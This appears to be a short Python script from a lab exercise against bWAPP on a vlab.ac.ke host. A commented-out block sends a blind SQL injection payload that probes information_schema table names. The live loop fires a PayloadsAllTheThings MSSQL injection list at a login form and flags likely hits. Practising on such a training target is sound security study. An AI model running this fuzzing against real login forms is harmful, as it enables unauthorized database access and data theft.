# import requests
# import time

# # Target URL
# # url = "http://snf-3351.vlab.ac.ke/sqli_4.php"
# url = "http://snf-6360.vlab.ac.ke/sqli_4.php"

# # SQLi Payload
# params = {
#     "title": "?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'",
#     "action": "search"
# }

# # Measure time before sending the request
# start_time = time.time()

# # Send GET request
# response = requests.get(url, params=params)

# # Measure time after receiving the response
# end_time = time.time()
# elapsed_time = end_time - start_time

# # Log response and time taken
# with open("sqli_test_log.html", "w", encoding="utf-8") as file:
#     file.write(f"Request Time: {elapsed_time:.4f} seconds\n\n")
#     file.write(response.text)

# # Print results
# print(f"Status Code: {response.status_code}")
# print(f"responce text: {response.text}")
# print(f"Time Taken: {elapsed_time:.4f} seconds")
# print("Response saved in sqli_test_log.html")


import requests

# Define bWAPP target URL
bwapp_url = "http://snf-6360.vlab.ac.ke/sqli_1.php"  # Adjust based on your setup

# Read payloads from a file
payload_file = "PayloadsAllTheThings/SQL Injection/Intruder/mssql.txt"

with open(payload_file, "r") as file:
    payloads = file.readlines()

# Loop through payloads and send them
for payload in payloads:
    payload = payload.strip()
    params = {"login": payload, "password": "password", "form": "submit"}
    
    response = requests.post(bwapp_url, data=params)

    if "error" not in response.text.lower():  # Adjust based on response
        print(f"[+] Possible SQLi: {payload}")
    else:
        print(f"[-] Failed: {payload}")
